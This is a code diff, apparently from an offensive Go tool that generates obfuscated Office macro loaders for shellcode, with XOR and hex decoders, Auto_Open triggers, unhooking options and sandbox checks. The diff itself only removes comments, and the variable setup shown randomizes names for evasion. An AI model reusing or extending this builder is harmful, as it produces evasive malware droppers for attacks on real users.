@@ -152,10 +152,7 @@ func Java_Code_Buff(product string) (string, string, string, string, string, str
 	javacode := &JavaCode{}
 	javacode.Variables = make(map[string]string)
 	var struct_option string
-	//Java code variables//
 	javacode.Variables["objOffice"] = Cryptor.VarNumberLength(4, 9)
-	// javacode.Variables["objWord"] = Cryptor.VarNumberLength(4, 9)
-	// javacode.Variables["objPP"] = Cryptor.VarNumberLength(4, 9)
 	javacode.Variables["WshShell"] = Cryptor.VarNumberLength(4, 9)
 	javacode.Variables["Application_Version"] = Cryptor.VarNumberLength(4, 9)
 	javacode.Variables["strRegPath"] = Cryptor.VarNumberLength(4, 9)
@@ -165,8 +162,7 @@ func Java_Code_Buff(product string) (string, string, string, string, string, str
 	javacode.Variables["DecodedValue"] = Cryptor.VarNumberLength(4, 9)
 	javacode.Variables["shellcode"] = Cryptor.VarNumberLength(4, 9)
 	javacode.Variables["Auto_Open"] = Cryptor.VarNumberLength(4, 9)
-
-	//Creating Code Snippets//
+	
 	if product == "Excel" {
 		struct_option = Struct.Javacode_Start_Excel()
 	}
@@ -190,13 +186,11 @@ func Java_Code_Buff(product string) (string, string, string, string, string, str
 
 }
 
-//pre-Second
 func Code1_Buff(shellcode string, stageless bool, EncodedPayload string, DecodedValue string, rrawpayload32 string, rrawpayload64 string, VBAkey string, Auto_Open string, debugging bool, unhook bool, process32 string, process64 string) (string, string) {
 	code1 := &Code1{}
 	code1.Variables = make(map[string]string)
 	var shellcodebuff string
 	var Structvalue string
-	//code1 variables//
 	code1.Variables["shellcode"] = shellcode
 	code1.Variables["EncodedPayload"] = EncodedPayload
 	code1.Variables["VBACode32"] = Cryptor.VbaCodePayload(rrawpayload32, code1.Variables["EncodedPayload"], stageless, code1.Variables["shellcode"])
@@ -291,14 +285,11 @@ func Code1_Buff(shellcode string, stageless bool, EncodedPayload string, Decoded
 	return shellcodebuff, code1.Variables["Function"]
 }
 
-//pre-Second
 func Code2_Buff(shellcode string, stageless bool, EncodedPayload string, DecodedValue string, rrawpayload32 string, rrawpayload64 string, VBAkey string, Auto_Open string, debugging bool, unhook bool) (string, string) {
-
 	code2 := &Code2{}
 	code2.Variables = make(map[string]string)
 	var shellcodebuff string
 	var Structvalue string
-	//code2 variables//
 	code2.Variables["EncodedPayload"] = EncodedPayload
 	code2.Variables["shellcode"] = shellcode
 	code2.Variables["shellLength"] = Cryptor.VarNumberLength(4, 9)
@@ -415,7 +406,6 @@ func Decoder_Start_Buff(shellcode string, EncodedPayload string, DecodedValue st
 	decodestarter := &DecodeStarter{}
 	decodestarter.Variables = make(map[string]string)
 
-	//DecoderStart variables//
 	decodestarter.Variables["shellcode"] = shellcode
 	decodestarter.Variables["xorFunction"] = Cryptor.VarNumberLength(4, 9)
 	decodestarter.Variables["hexDecodeFunction"] = Cryptor.VarNumberLength(4, 9)
@@ -445,13 +435,11 @@ func Decoder_Start_Buff(shellcode string, EncodedPayload string, DecodedValue st
 func VBA_Decode_Buff(VBAkey string, shellcode string, hexDecodeFunction string, xorFunction string, DecodedValue string, Function string, stageless bool) string {
 	vbadecode := &VBADECODE{}
 	vbadecode.Variables = make(map[string]string)
-	//VBA Decode//
 	vbadecode.Variables["VBAKey"] = VBAkey
 	vbadecode.Variables["shellcode"] = shellcode
 	vbadecode.Variables["hexDecodeFunction"] = hexDecodeFunction
 	vbadecode.Variables["hexInput"] = Cryptor.VarNumberLength(4, 9)
 	vbadecode.Variables["hexI"] = Cryptor.VarNumberLength(4, 9)
-	//
 	vbadecode.Variables["xorFunction"] = xorFunction
 	vbadecode.Variables["xorKey"] = Cryptor.VarNumberLength(4, 9)
 	vbadecode.Variables["xorA"] = Cryptor.VarNumberLength(4, 9)
@@ -481,7 +469,6 @@ func VBA_Decode_Buff(VBAkey string, shellcode string, hexDecodeFunction string, 
 func End_Code_Buff(objWorkbook string, objExcel string, xlmodule string, shellcode string, Auto_Open string) string {
 	endcode := &EndCode{}
 	endcode.Variables = make(map[string]string)
-	//EndCode variables//
 	endcode.Variables["objWorkbook"] = objWorkbook
 	endcode.Variables["objOffice"] = objExcel
 	endcode.Variables["xlmodule"] = xlmodule
@@ -576,7 +563,6 @@ func Macro_Code_Buff(URL string, outFile string) {
 func Sandbox_Code_Buff() string {
 	sandbox := &sandbox{}
 	sandbox.Variables = make(map[string]string)
-	//Sandbox variables//
 	sandbox.Variables["domain"] = Cryptor.VarNumberLength(4, 9)
 	sandbox.Variables["proc"] = Cryptor.VarNumberLength(4, 9)
 	sandbox.Variables["WSHShell"] = Cryptor.VarNumberLength(4, 9)
